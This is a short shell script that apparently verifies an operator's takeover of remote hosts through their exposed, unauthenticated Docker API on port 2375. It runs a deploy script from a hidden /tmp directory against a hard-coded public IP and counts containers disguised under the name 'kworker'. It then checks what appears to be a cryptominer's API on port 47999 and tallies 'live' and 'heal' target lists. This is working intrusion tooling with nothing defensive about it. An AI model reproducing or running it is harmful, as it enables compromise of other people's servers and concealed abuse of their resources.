#!/bin/sh
# throwaway verification: one host, end to end. Checks that a stale host is now really
# replaced (old stopped to free :47999 -> new deployed -> host answers its own API).
set -u
S=/tmp/.sysd
sh -n "$S/dock.sh" && echo DOCK_SYNTAX_OK || echo DOCK_SYNTAX_FAIL
sh -n "$S/dockhot.sh" && echo HOT_SYNTAX_OK || echo HOT_SYNTAX_FAIL
IP=${1:-178.128.21.57}

echo "== before: containers on $IP (kworker count) and :47999"
curl -sS -m 5 "http://$IP:2375/containers/json?all=1" 2>/dev/null | grep -c kworker
curl -sS -m 5 "http://$IP:47999/2/summary" 2>/dev/null | head -c 120; echo

echo "== single-host run (timeout 170)"
timeout 170 sh "$S/dock.sh" "$IP" 2>&1 | tail -14

echo "== after: container Cmd flags on $IP"
curl -sS -m 6 "http://$IP:2375/containers/json?all=0" 2>/dev/null | grep -o -e threads -e http-port -e PortBindings -e kworker | sort | uniq -c

echo "== after: $IP :47999/2/summary"
curl -sS -m 6 "http://$IP:47999/2/summary" 2>/dev/null | head -c 400; echo

echo "== live=$(sort -u -k1,1 "$S/.hunt/dock.live" | wc -l)  heal=$(wc -l < "$S/.hunt/heal.list" 2>/dev/null)"
date -u
